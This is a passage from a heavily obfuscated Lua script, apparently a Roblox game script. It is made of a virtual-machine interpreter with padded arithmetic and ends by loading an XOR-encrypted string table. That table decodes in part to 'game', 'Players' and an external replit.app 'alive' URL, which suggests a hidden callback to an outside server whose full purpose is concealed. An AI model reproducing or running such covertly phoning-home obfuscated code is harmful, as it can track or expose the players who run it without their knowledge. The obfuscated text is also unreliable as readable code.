830)) ;v85[v408]=v180[v182];end end elseif ((1066>=452) and (v88<=(3 + 0))) then do return;end elseif ((4974>=2655) and (41<=4259) and (v88>(130 -(116 + (1182 -(786 + 386)))))) then v85[v87[1 + 1 ]]=v87[741 -(542 + 196) ] + v85[v87[8 -4 ]] ;else v79=v87[1 + 2 ];end elseif (v88<=(5 + 3)) then if (v88<=(3 + 3)) then v85[v87[4 -2 ]]= #v85[v87[7 -4 ]];elseif (v88==7) then local v185=v87[1553 -((3646 -2520) + 425) ];local v186={};for v411=406 -(118 + 287) , #v84 do local v412=1379 -(1055 + 324) ;local v413;while true do if (v412==((1340 -(1093 + 247)) -0)) then v413=v84[v411];for v593=1121 -(118 + 1003) , #v413 do local v594=v413[v593];local v595=v594[(2 + 0) -1 ];local v596=v594[379 -(142 + 25 + 210) ];if ((v595==v85) and (v596>=v185)) then local v599=0 -0 ;while true do if (v599==(0 + (0 -0))) then v186[v596]=v595[v596];v594[978 -(553 + 424) ]=v186;break;end end end end break;end end end else local v187=v87[3 -(3 -2) ];v85[v187]=v85[v187](v13(v85,v187 + 1 + 0 ,v80));end elseif ((v88<=10) or (1930<56)) then if (v88==(9 + 0)) then local v189;local v190;local v191;v85[v87[(5 -3) + 0 ]]={};v79=v79 + 1 ;v87=v75[v79];v85[v87[(2 -1) + 1 ]]=v87[2 + 1 ];v79=v79 + ((1 + 1) -1) ;v87=v75[v79];v85[v87[5 -(11 -8) ]]= #v85[v87[6 -(10 -7) ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v87[1 + 2 ];v79=v79 + (4 -(3 + 0)) ;v87=v75[v79];v191=v87[2];v190=v85[v191];v189=v85[v191 + (755 -(239 + 514)) ];if ((v189>(0 + 0)) or (2721<=907)) then if (v190>v85[v191 + (1330 -(797 + (1360 -828))) ]) then v79=v87[3 + 0 ];else v85[v191 + (691 -(364 + 324)) ]=v190;end elseif (v190<v85[v191 + 1 ]) then v79=v87[2 + 1 ];else v85[v191 + (6 -3) ]=v190;end else local v202;v85[v87[1204 -(373 + 829) ]]=v87[734 -((1304 -828) + 255) ];v79=v79 + (1131 -(369 + 761)) ;v87=v75[v79];v202=v87[2];v85[v202]=v85[v202](v13(v85,v202 + 1 ,v87[2 + 1 ]));v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[3 -1 ]][v87[241 -(64 + 174) ]]=v85[v87[1 + 3 ]];v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[338 -((345 -201) + 192) ]]=v85[v87[1 + 2 ]];v79=v79 + (217 -(42 + 174)) ;v87=v75[v79];v85[v87[2 + 0 ]]=v87[3];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[(4 -3) + 1 ]]=v87[1507 -(363 + 1141) ];v79=v79 + (1581 -(1183 + 397)) ;v87=v75[v79];v202=v87[5 -3 ];v85[v202]=v85[v202](v13(v85,v202 + 1 + 0 ,v87[3 + 0 ]));v79=v79 + (1976 -(1913 + 62)) ;v87=v75[v79];v85[v87[2 + 0 ]][v87[(10 -3) -4 ]]=v85[v87[1937 -(565 + 1368) ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[1663 -(1477 + 184) ]]=v85[v87[3 -(0 -0) ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[2 + 0 ]]=v87[859 -(564 + 292) ];end elseif ((3333==3333) and (v88==11)) then v85[v87[2 -0 ]]=v85[v87[3]]%v87[11 -7 ] ;else v85[v87[2]]=v85[v87[307 -(244 + 60) ]];end elseif ((4437>=3031) and (v88<=19)) then if (v88<=(12 + 3)) then if (v88<=(489 -(41 + 435))) then local v134;local v135;v85[v87[(2271 -(1249 + 19)) -(847 + 91 + 63) ]]=v63[v87[3 + 0 ]];v79=v79 + 1 ;v87=v75[v79];v135=v87[1127 -(936 + 189) ];v134=v85[v87[1 + 2 ]];v85[v135 + (1614 -((6091 -4526) + 48)) ]=v134;v85[v135]=v134[v87[3 + 1 ]];v79=v79 + (1139 -(782 + 356)) ;v87=v75[v79];v85[v87[269 -((1262 -(686 + 400)) + 91) ]]=v62[v87[7 -4 ]];v79=v79 + 1 ;v87=v75[v79];v135=v87[2 -0 ];do return v85[v135](v13(v85,v135 + (1093 -(975 + 117)) ,v87[(1474 + 404) -(157 + 1718) ]));end v79=v79 + 1 ;v87=v75[v79];v135=v87[2 + 0 ];do return v13(v85,v135,v80);end v79=v79 + (3 -2) ;v87=v75[v79];do return;end elseif ((v88>(47 -33)) or (2225==20)) then local v225;v85[v87[2]]=v85[v87[1021 -(697 + 321) ]];v79=v79 + (2 -(230 -(73 + 156))) ;v87=v75[v79];v85[v87[3 -(1 + 0) ]]=v87[6 -3 ];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[3 -1 ]]=v87[7 -4 ];v79=v79 + (1228 -(322 + 905)) ;v87=v75[v79];v225=v87[613 -(602 + 9) ];v85[v225]=v85[v225](v13(v85,v225 + (1190 -(449 + 740)) ,v87[875 -(826 + 46) ]));v79=v79 + (948 -(245 + 702)) ;v87=v75[v79];v85[v87[(817 -(721 + 90)) -4 ]][v87[1 + 2 ]]=v85[v87[1902 -(260 + 19 + 1619) ]];v79=v79 + (441 -(382 + 58)) ;v87=v75[v79];v85[v87[2]]=v85[v87[9 -6 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[3 -1 ]]=v87[8 -5 ];v79=v79 + (1206 -(902 + 303)) ;v87=v75[v79];v85[v87[3 -1 ]]=v87[6 -3 ];v79=v79 + 1 + 0 ;v87=v75[v79];v225=v87[1692 -(1121 + 569) ];v85[v225]=v85[v225](v13(v85,v225 + (215 -(22 + (623 -431))) ,v87[686 -(483 + 200) ]));v79=v79 + (1464 -(1404 + 59)) ;v87=v75[v79];v85[v87[5 -3 ]][v87[3 -0 ]]=v85[v87[769 -((938 -(224 + 246)) + 297) ]];else local v242=562 -(334 + 228) ;local v243;local v244;local v245;while true do if (((23 -16)==v242) or (4470<2949)) then v87=v75[v79];v245=v87[2];v85[v245](v85[v245 + ((2 -0) -1) ]);v242=14 -6 ;end if ((v242==(1 + 0)) or (872>=3092) or (1580==2426)) then v85[v87[(437 -199) -(141 + 95) ]]=v85[v87[3 + 0 ]][v87[9 -5 ]];v79=v79 + (2 -1) ;v87=v75[v79];v242=1 + 1 ;end if (v242==(13 -8)) then v87=v75[v79];v244=v87[3 + 0 ];v243=v85[v244];v242=6;end if ((5 + 4)==v242) then v79=v79 + (1 -0) ;v87=v75[v79];v79=v87[3];break;end if ((4404>=3252) and (v242==(0 + 0 + 0))) then v243=nil;v244=nil;v245=nil;v242=164 -(92 + 71) ;end if (((1107>796) and (v242==(2 + 2))) or (3711==503)) then v245=v87[2 -0 ];v85[v245]=v85[v245](v85[v245 + (766 -(574 + 191)) ]);v79=v79 + 1 + 0 ;v242=12 -7 ;end if (v242==(5 + 3)) then v79=v79 + ((21 + 829) -(254 + 595)) ;v87=v75[v79];v85[v87[(95 + 33) -((109 -54) + 71) ]]=v87[3 -0 ];v242=1799 -(573 + 1217) ;end if (v242==(5 -3)) then v85[v87[1 + 1 ]]=v63[v87[4 -1 ]];v79=v79 + (940 -(714 + 225)) ;v87=v75[v79];v242=8 -5 ;end if (v242==3) then v85[v87[(6 -4) -0 ]]=v85[v87[1 + 2 ]];v79=v79 + (1 -0) ;v87=v75[v79];v242=810 -(118 + 688) ;end if ((959==959) and (v242==6)) then for v563=v244 + (49 -((538 -(203 + 310)) + 23)) ,v87[1 + (1996 -(1238 + 755)) ] do v243=v243   .. v85[v563] ;end v85[v87[1888 -(927 + 959) ]]=v243;v79=v79 + (3 -2) ;v242=739 -(16 + 716) ;end end end elseif ((v88<=(32 -15)) or (245>=2204)) then if (v88==((8 + 105) -(11 + 86))) then local v246=0 -0 ;local v247;local v248;local v249;while true do if ((287 -(175 + 110))==v246) then for v564=(1536 -(709 + 825)) -1 ,v87[19 -(27 -12) ] do v79=v79 + (1797 -((731 -228) + 1293)) ;local v565=v75[v79];if ((3162>=2069) and (v565[2 -(865 -(196 + 668)) ]==(9 + 3))) then v249[v564-(1062 -(810 + 251)) ]={v85,v565[1 + 2 ]};else v249[v564-(1 + 0) ]={v62,v565[11 -8 ]};end v84[ #v84 + 1 ]=v249;end v85[v87[(3399 -2538) -(240 + 619) ]]=v29(v247,v248,v63);break;end if (v246==(0 + 0)) then v247=v76[v87[4 -1 ]];v248=nil;v246=1;end if ((1 + 0)==v246) then v249={};v248=v10({},{__index=function(v567,v568) local v569=v249[v568];return v569[1745 -(1344 + 400) ][v569[407 -(255 + 150) ]];end,__newindex=function(v570,v571,v572) local v573=0 + 0 ;local v574;while true do if (((0 + 0)==v573) or (420==4318)) then v574=v249[v571];v574[4 -3 ][v574[6 -4 ]]=v572;break;end end end});v246=1741 -(404 + 1335) ;end end else v85[v87[408 -(183 + 223) ]]=v85[v87[3 -(833 -(171 + 662)) ]][v87[3 + 1 ]];end elseif (v88>(7 + 11)) then local v252=v87[339 -(10 + 327) ];local v253,v254=v78(v85[v252](v13(v85,v252 + 1 + 0 ,v80)));v80=(v254 + v252) -(339 -(118 + 220)) ;local v255=0;for v414=v252,v80 do v255=v255 + 1 + 0 ;v85[v414]=v253[v255];end else local v256=0;local v257;while true do if (v256==(449 -(108 + 341))) then v257=v87[1 + 1 ];do return v85[v257](v13(v85,v257 + (4 -3) ,v87[3]));end break;end end end elseif ((v88<=(1515 -(711 + 782))) or (306>3081)) then if (v88<=((131 -(4 + 89)) -18)) then local v148=0;local v149;while true do if (v148==(469 -(270 + 199))) then v149=v87[1 + 1 ];v85[v149](v85[v149 + (1820 -((2032 -1452) + 1239)) ]);break;end end elseif (v88>(8 + 13)) then if ((v87[5 -3 ]==v85[v87[4 + 0 ]]) or (3513<2706)) then v79=v79 + 1 + 0 ;else v79=v87[2 + (4 -3) ];end else v85[v87[4 -2 ]]=v63[v87[2 + 1 ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v85[v87[3]][v87[4]];v79=v79 + ((459 + 709) -(645 + 522)) ;v87=v75[v79];v85[v87[1792 -(1010 + 780) ]]=v85[v87[3]][v87[4 + 0 ]];v79=v79 + (4 -3) ;v87=v75[v79];v85[v87[2]]=v87[(1494 -(35 + 1451)) -(1458 -(28 + 1425)) ];v79=v79 + (1837 -(1045 + 791)) ;v87=v75[v79];v79=v87[7 -4 ];end elseif (v88<=24) then if (v88==(34 -11)) then local v267=v87[(2500 -(941 + 1052)) -(351 + 154) ];local v268=v85[v267 + 2 ];local v269=v85[v267] + v268 ;v85[v267]=v269;if ((v268>(1574 -(1281 + 293))) or (4158<=33)) then if ((2978<3639) and (v269<=v85[v267 + 1 ])) then v79=v87[(258 + 11) -(28 + 238) ];v85[v267 + ((1520 -(822 + 692)) -3) ]=v269;end elseif ((v269>=v85[v267 + (1560 -(1381 + 178)) ]) or (99>4744)) then v79=v87[3 + 0 ];v85[v267 + 3 + 0 ]=v269;end else local v271;v85[v87[1 + 1 ]][v87[10 -7 ]]=v85[v87[4]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[472 -(381 + 89) ]]=v85[v87[3 + (0 -0) ]];v79=v79 + 1 + 0 + 0 ;v87=v75[v79];v85[v87[(299 -(45 + 252)) -0 ]]=v87[3];v79=v79 + ((1145 + 12) -(1074 + 82)) ;v87=v75[v79];v85[v87[3 -1 ]]=v87[1787 -(214 + 1570) ];v79=v79 + (1456 -(341 + 649 + 465)) ;v87=v75[v79];v271=v87[1 + 1 ];v85[v271]=v85[v271](v13(v85,v271 + 1 + 0 ,v87[3]));v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[7 -5 ]][v87[(4207 -2478) -(1668 + 58) ]]=v85[v87[4]];v79=v79 + (627 -(512 + 114)) ;v87=v75[v79];v85[v87[5 -3 ]]=v85[v87[5 -2 ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[(434 -(114 + 319)) + 1 ]]=v87[(1 -0) + 2 ];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[6 -4 ]]=v87[3];v79=v79 + 1 ;v87=v75[v79];v271=v87[1996 -(109 + 1885) ];v85[v271]=v85[v271](v13(v85,v271 + (1470 -(1269 + 200)) ,v87[5 -2 ]));end elseif ((3682>=2888) and (v88>(840 -((125 -27) + 717)))) then v85[v87[828 -(802 + 24) ]]=v62[v87[5 -2 ]];else v85[v87[2 -0 ]]=v85[v87[2 + 1 ]][v85[v87[1 + 3 ]]];end elseif ((149<479) and (v88<=(30 + 9))) then if (v88<=32) then if ((4341==4341) and (v88<=(5 + 24))) then if (v88<=27) then local v150=0 + 0 ;local v151;while true do if ((255<=1596) and (1020>=567) and (v150==(0 -0))) then v151=v87[6 -4 ];v85[v151]=v85[v151](v85[v151 + 1 ]);break;end end elseif (v88==(11 + 17)) then if v85[v87[1 + 1 ]] then v79=v79 + 1 + 0 ;else v79=v87[3 + 0 ];end else for v420=v87[1 + 1 ],v87[3] do v85[v420]=nil;end end elseif (v88<=(1463 -(797 + (947 -311)))) then v85[v87[(18 -9) -7 ]]={};elseif (v88>31) then local v294=v87[1621 -(1427 + 192) ];local v295=v85[v87[2 + 1 ]];v85[v294 + 1 ]=v295;v85[v294]=v295[v87[8 -4 ]];else local v299=v87[2];v85[v299]=v85[v299]();end elseif ((v88<=(32 + (1966 -(556 + 1407)))) or (733>2469)) then if (v88<=(15 + 18)) then local v153=0;local v154;while true do if (v153==(326 -(192 + 134))) then v154=v87[1278 -(316 + 960) ];v85[v154](v13(v85,v154 + 1 ,v80));break;end end elseif (v88==(19 + 15)) then if (v85[v87[2 + 0 ]]==v87[4]) then v79=v79 + 1 + 0 ;else v79=v87[11 -8 ];end else local v301=v85[v87[555 -(83 + 468) ]];if  not v301 then v79=v79 + (1807 -(1202 + 604)) ;else v85[v87[9 -7 ]]=v301;v79=v87[4 -1 ];end end elseif ((2497==2497) and (v88<=37)) then if ((v88==(99 -(1269 -(741 + 465)))) or (4433<1635)) then local v302=325 -((510 -(170 + 295)) + 280) ;local v303;local v304;local v305;while true do if (v302==7) then v303=v87[2 + 0 ];v85[v303]=v85[v303](v85[v303 + 1 ]);v79=v79 + 1 + 0 ;v87=v75[v79];v302=3 + 5 ;end if ((v302==(4 + 2)) or (4300<3244)) then v87=v75[v79];v85[v87[1 + 1 ]]=v85[v87[5 -2 ]];v79=v79 + (1912 -(340 + 1571)) ;v87=v75[v79];v302=3 + 4 ;end if (1==v302) then v79=v79 + 1 ;v87=v75[v79];v85[v87[1774 -(914 + 819 + 39) ]]=v85[v87[8 -5 ]];v79=v79 + (1035 -(125 + 909)) ;v302=1950 -(1096 + 852) ;end if ((v302==(2 + 1)) or (3534>4677)) then v85[v87[2 -0 ]]=v304;v79=v79 + 1 + 0 ;v87=v75[v79];v303=v87[2];v302=516 -(409 + 103) ;end if (v302==5) then v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v63[v87[239 -(46 + 190) ]];v79=v79 + ((89 + 7) -(51 + 44)) ;v302=2 + 4 ;end if (v302==2) then v87=v75[v79];v305=v87[1320 -((2742 -1628) + 203) ];v304=v85[v305];for v579=v305 + (727 -(228 + 498)) ,v87[1 + 3 ] do v304=v304   .. v85[v579] ;end v302=2 + 0 + 1 ;end if ((3901==3901) and ((671 -(112 + 62 + 489))==v302)) then v85[v87[5 -3 ]]=v85[v87[(1081 + 827) -(830 + 1075) ]][v87[528 -(303 + 221) ]];v79=v79 + (1270 -(231 + 1038)) ;v87=v75[v79];v85[v87[(1232 -(957 + 273)) + 0 ]]=v85[v87[3]];break;end if ((201<415) and (v302==0)) then v303=nil;v304=nil;v305=nil;v85[v87[2]]=v85[v87[1165 -(46 + 125 + 991) ]][v87[16 -(5 + 7) ]];v302=(7 -5) -(2 -1) ;end if (v302==4) then v85[v303](v85[v303 + (2 -1) ]);v79=v79 + 1 + (0 -0) ;v87=v75[v79];v85[v87[2]]=v85[v87[3]][v87[13 -9 ]];v302=14 -9 ;end end else v85[v87[2]]={};v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v63[v87[4 -1 ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[1250 -(111 + 1137) ]]=v85[v87[161 -(91 + 67) ]][v87[11 -7 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[525 -(423 + 100) ]]=v63[v87[1 + 2 ]];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[2 + 0 ]]=v85[v87[774 -(326 + 445) ]][v87[17 -13 ]];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[(19 -15) -2 ]]=v63[v87[714 -(530 + 181) ]];v79=v79 + (882 -(614 + 267)) ;v87=v75[v79];v85[v87[1782 -(389 + 1391) ]]=v85[v87[35 -(19 + 13) ]][v87[6 -2 ]];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[5 -3 ]]=v63[v87[1 + 2 ]];v79=v79 + 1 ;v87=v75[v79];if ( not v85[v87[3 -1 ]] or (4859<2999)) then v79=v79 + 1 ;else v79=v87[6 -3 ];end end elseif (v88==(1850 -(812 + 481 + 519))) then local v320;v85[v87[2]]=v87[(1 + 4) -(4 -2) ];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[953 -(783 + 168) ]]=v87[5 -2 ];v79=v79 + (4 -3) ;v87=v75[v79];v320=v87[4 -2 ];v85[v320]=v85[v320](v13(v85,v320 + 1 + 0 ,v87[3]));v79=v79 + 1 ;v87=v75[v79];v85[v87[1 + 1 ]][v87[3]]=v85[v87[9 -5 ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[1 + 1 ]]=v85[v87[1 + 2 ]];v79=v79 + (3 -2) + 0 ;v87=v75[v79];v85[v87[1098 -(709 + 381 + 6) ]]=v87[3];v79=v79 + (312 -(309 + 2)) ;v87=v75[v79];v85[v87[1860 -(673 + 1185) ]]=v87[3];v79=v79 + (2 -1) ;v87=v75[v79];v320=v87[6 -4 ];v85[v320]=v85[v320](v13(v85,v320 + 1 ,v87[4 -1 ]));v79=v79 + 1 ;v87=v75[v79];v85[v87[2 + 0 ]][v87[3 + 0 ]]=v85[v87[5 -1 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[3 -1 ]]=v85[v87[3]];else v85[v87[(9 -6) -1 ]]=v63[v87[1883 -(446 + 1434) ]];end elseif (v88<=46) then if (v88<=(1325 -(1040 + 243))) then if (v88<=(119 -79)) then local v155=v87[1850 -((1771 -(1090 + 122)) + 1288) ];local v156=v85[v155];for v160=v155 + (1932 -(609 + 1322)) ,v87[458 -(13 + 441) ] do v156=v156   .. v85[v160] ;end v85[v87[2]]=v156;elseif ((4726>2407) and ((v88==((50 + 103) -112)) or (133==1784))) then local v342=v87[2];local v343={v85[v342](v85[v342 + (4 -3) ])};local v344=0 + 0 ;for v423=v342,v87[(46 -32) -10 ] do v344=v344 + 1 + 0 ;v85[v423]=v343[v344];end else local v345;local v346;local v347;v85[v87[1 + 1 ]]=v87[8 -5 ];v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v63[v87[2 + 1 ]];v79=v79 + ((1 + 0) -0) ;v87=v75[v79];v85[v87[2 + 0 ]]=v85[v87[2 + 1 ]];v79=v79 + (1119 -(628 + 490)) + 0 + 0 ;v87=v75[v79];v347=v87[2];v85[v347]=v85[v347](v85[v347 + 1 + 0 ]);v79=v79 + 1 + 0 ;v87=v75[v79];v346=v87[3];v345=v85[v346];for v426=v346 + 1 ,v87[437 -(153 + 280) ] do v345=v345   .. v85[v426] ;end v85[v87[5 -3 ]]=v345;v79=v79 + (2 -1) + 0 ;v87=v75[v79];v347=v87[1 + 1 ];v85[v347](v85[v347 + 1 ]);v79=v79 + 1 ;v87=v75[v79];v79=v87[2 + 1 ];end elseif (v88<=(40 + 4)) then if (v88==(32 + 11)) then if ( not v85[v87[2]] or (1284>3669)) then v79=v79 + ((4 -3) -0) ;else v79=v87[3];end else local v362=0 + 0 ;local v363;while true do if (v362==(667 -((863 -(431 + 343)) + 578))) then v363=v87[2];v85[v363]=v85[v363](v13(v85,v363 + 1 + 0 ,v87[5 -2 ]));break;end end end elseif (v88==(1094 -(572 + 477))) then local v364=v87[1 + 1 ];do return v13(v85,v364,v80);end else local v365=0 + 0 ;local v366;local v367;local v368;local v369;while true do if ((1117<2549) and ((v365==(1 + 3)) or (7>=310))) then v85[v87[(177 -89) -(84 + 2) ]]=v85[v87[4 -1 ]] + v87[3 + 1 ] ;v79=v79 + (843 -(497 + 345)) ;v87=v75[v79];v369=v87[1 + (2 -1) ];v367,v368=v78(v85[v369](v13(v85,v369 + 1 + 0 ,v87[3])));v80=(v368 + v369) -1 ;v365=1338 -(605 + 576 + 152) ;end if (v365==(8 + 3)) then v79=v79 + (1 -0) ;v87=v75[v79];v369=v87[1 + 1 ];v367,v368=v78(v85[v369](v13(v85,v369 + (3 -2) ,v87[3 + 0 + 0 ])));v80=(v368 + v369) -(2 -1) ;v366=1695 -(556 + 1139) ;v365=10 + (17 -(6 + 9)) ;end if ((v365==(489 -(457 + 32))) or (2851>4774)) then v366=nil;v367,v368=nil;v369=nil;v85[v87[2]]=v85[v87[2 + 1 ]];v79=v79 + (1403 -(832 + 570)) ;v87=v75[v79];v365=1 + 0 ;end if ((1031<3848) and (4992>286) and (v365==(3 + 7))) then v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[2]]=v87[2 + 1 ] + v85[v87[800 -(588 + 208) ]] ;v79=v79 + 1 ;v87=v75[v79];v85[v87[5 -3 ]]=v85[v87[1803 -(884 + 916) ]] + v87[8 -4 ] ;v365=2 + 5 + 4 ;end if ((1854>903) and (v365==(659 -(232 + 421)))) then v79=v79 + 1 ;v87=v75[v79];v85[v87[1891 -(1569 + 320) ]]=v62[v87[3]];v79=v79 + 1 ;v87=v75[v79];v85[v87[1 + 0 + 1 ]]=v62[v87[1 + 2 ]];v365=23 -16 ;end if (v365==(621 -(316 + 289))) then v369=v87[5 -3 ];v85[v369](v13(v85,v369 + 1 ,v80));break;end if ((4663>1860) and (v365==13)) then v366=0;for v580=v369,v80 do v366=v366 + 1 + (169 -(28 + 141)) ;v85[v580]=v367[v366];end v79=v79 + 1 ;v87=v75[v79];v369=v87[1455 -(666 + 787) ];v85[v369]=v85[v369](v13(v85,v369 + (426 -(360 + 65)) ,v80));v365=6 + 8 ;end if ((v365==(1 + 0)) or (2561==3893) or (3053<=469)) then v85[v87[256 -((96 -17) + 124 + 51) ]]=v62[v87[3]];v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[2]]=v62[v87[3 + 0 ]];v79=v79 + (2 -1) ;v87=v75[v79];v365=3 -1 ;end if (v365==2) then v85[v87[2]]=v62[v87[902 -(503 + 396) ]];v79=v79 + (182 -((1409 -(486 + 831)) + (231 -142))) ;v87=v75[v79];v85[v87[3 -1 ]]=v62[v87[2 + 1 ]];v79=v79 + 1 ;v87=v75[v79];v365=2 + 1 ;end if (((4362>=1421) and (v365==(31 -23))) or (540>=1869)) then v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[4 -2 ]]=v85[v87[3 + 0 ]]%v85[v87[(6 -4) + 2 ]] ;v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[1 + 1 ]]=v87[3] + v85[v87[(1 + 4) -1 ]] ;v365=1253 -((1533 -1048) + 759) ;end if ((75<=3546) and (v365==(27 -(1278 -(668 + 595))))) then for v583=v369,v80 do local v584=1189 -(442 + 747) ;while true do if ((2680<=3418) and (((1022 + 113) -(832 + 303))==v584)) then v366=v366 + 1 ;v85[v583]=v367[v366];break;end end end v79=v79 + ((191 + 756) -(88 + (2339 -1481))) ;v87=v75[v79];v369=v87[1 + 1 ];v367,v368=v78(v85[v369](v13(v85,v369 + 1 ,v80)));v80=(v368 + v369) -(1 + 0) ;v365=13;end if ((3292==3292) and (v365==(1 + 4))) then v366=789 -(766 + 23) ;for v585=v369,v80 do local v586=0 -0 ;while true do if ((1038<=2645) and (v586==0)) then v366=v366 + (1 -0) ;v85[v585]=v367[v366];break;end end end v79=v79 + (2 -1) ;v87=v75[v79];v369=v87[6 -4 ];v85[v369]=v85[v369](v13(v85,v369 + (1074 -(1036 + 37)) ,v80));v365=5 + 1 ;end if ((v365==(5 -2)) or (4288<2876)) then v85[v87[2 + 0 ]]=v85[v87[1483 -(641 + 839) ]];v79=v79 + (914 -(910 + 3)) ;v87=v75[v79];v85[v87[4 -2 ]]=v85[v87[(1977 -(23 + 267)) -(1466 + (2162 -(1129 + 815))) ]];v79=v79 + 1 ;v87=v75[v79];v365=2 + 2 ;end if ((v365==14) or (3230<2525)) then v79=v79 + (1149 -(556 + 592)) ;v87=v75[v79];v85[v87[(388 -(371 + 16)) + 1 ]]=v85[v87[811 -(329 + 479) ]]%v87[858 -(174 + 680) ] ;v79=v79 + 1 ;v87=v75[v79];v369=v87[6 -4 ];v365=15;end if ((2462>=1147) and (v365==(18 -9))) then v79=v79 + (1751 -(1326 + 424)) ;v87=v75[v79];v85[v87[2 + 0 ]]= #v85[v87[742 -((749 -353) + 343) ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[1 + 1 ]]=v85[v87[1480 -(29 + (1566 -(88 + 30))) ]]%v85[v87[4]] ;v365=(2170 -(720 + 51)) -(135 + (2789 -1535)) ;end if (v365==(56 -41)) then v367,v368=v78(v85[v369](v85[v369 + (4 -3) ]));v80=(v368 + v369) -(1 + 0) ;v366=0;for v587=v369,v80 do v366=v366 + (1528 -(389 + 1138)) ;v85[v587]=v367[v366];end v79=v79 + (575 -(102 + 472)) ;v87=v75[v79];v365=16 + (1776 -(421 + 1355)) ;end if (v365==(4 + 3)) then v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[1547 -(320 + 1225) ]]=v85[v87[5 -2 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[1466 -(157 + 1307) ]]= #v85[v87[1862 -(821 + (1712 -674)) ]];v365=8;end end end elseif (v88<=(122 -73)) then if ((v88<=(6 + 41)) or (2400>4083)) then v85[v87[2]]=v85[v87[3]]%v85[v87[4]] ;elseif ((v88>(84 -(18 + 18))) or (2745>4359)) then v85[v87[1 + 1 ]]=v87[7 -4 ];else local v372=1026 -(834 + 192) ;local v373;local v374;local v375;local v376;while true do if ((172<=1810) and (v372==(1 + 0))) then v80=(v375 + v373) -(1 + 0) ;v376=0 + 0 ;v372=2 -0 ;end if (((1387 -(286 + 797)) -(300 + 4))==v372) then v373=v87[2];v374,v375=v78(v85[v373](v13(v85,v373 + 1 + 0 ,v87[7 -4 ])));v372=3 -2 ;end if (2==v372) then for v590=v373,v80 do v376=v376 + (363 -(112 + 250)) ;v85[v590]=v374[v376];end break;end end end elseif (v88<=51) then if (v88>(20 + 30)) then v85[v87[2]]=v85[v87[7 -4 ]] + v87[3 + (1 -0) ] ;else local v378;local v379;local v380;v85[v87[2 + 0 ]]=v85[v87[3 + 0 ]][v87[2 + 2 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[2]]=v85[v87[3]];v79=v79 + (1415 -(1001 + 413)) ;v87=v75[v79];v380=v87[442 -(397 + 42) ];v379=v85[v380];for v427=v380 + (2 -1) ,v87[(277 + 609) -(244 + 638) ] do v379=v379   .. v85[v427] ;end v85[v87[695 -(627 + 66) ]]=v379;v79=v79 + (801 -(24 + 776)) ;v87=v75[v79];v378=v87[5 -3 ];v85[v378](v85[v378 + 1 ]);v79=v79 + (603 -(512 + 90)) ;v87=v75[v79];v79=v87[1909 -((2565 -900) + 241) ];end elseif (v88>(769 -((1158 -(222 + 563)) + (757 -413)))) then v85[v87[2]][v87[2 + 1 ]]=v85[v87[2 + 2 + 0 ]];else local v393;local v394;local v395;v85[v87[5 -3 ]]=v85[v87[(194 -(23 + 167)) -1 ]][v87[4]];v79=v79 + ((2898 -(690 + 1108)) -(35 + 1064)) ;v87=v75[v79];v85[v87[2 + 0 ]]=v85[v87[6 -3 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v395=v87[3];v394=v85[v395];for v428=v395 + (1237 -(298 + 938)) ,v87[4] do v394=v394   .. v85[v428] ;end v85[v87[1261 -(233 + 371 + 655) ]]=v394;v79=v79 + (1667 -(636 + 1030)) ;v87=v75[v79];v393=v87[2 + 0 ];v85[v393](v85[v393 + 1 + 0 ]);v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[1 + 1 ]]=v87[224 -(55 + 166) ];v79=v79 + 1 + 0 ;v87=v75[v79];v79=v87[1 + 2 ];end v79=v79 + (3 -2) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!3B3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q003140030A3Q0081516811BA0BD35B624903063Q007EA7341074D9026Q003040030A3Q004103AA2E1518B826024B03043Q004B6776D9026Q002E4003083Q00D4E52158EA8E8FAD03063Q00C7EB90523D98026Q002C40030A3Q0093F12FC80DBA3CD5ECA903083Q00A7D6894AAB78CE53026Q002A4003073Q0039C0557C7160FD03083Q00876CAE3E121E1793026Q00244003083Q008BD543441BA9830203053Q007EDBB9223D026Q00224003073Q00678622CF23C95C03063Q00BE32E849A14C026Q00204003083Q009FD83935308E917C03053Q0079CAAB5C47026Q001840031A3Q0019EC2199AE31199931BF99142FCB42A88E113AD60CBE8E06709903063Q00624AB962DAEB026Q00104003053Q003BBFC2DBFF03053Q00934BDCA3B7028Q0003163Q007C3F562445723651295037094C354470532A5C4C3E1103073Q005A305035452922026Q00F03F027Q0040026Q00084003043Q007761726E03313Q00682Q7470733A2Q2F616C6976652D7365727665722Q2D6577612Q7372653Q642E7265706C69742E612Q702F616C69766503043Q0067616D6503073Q00506C6179657273030B3Q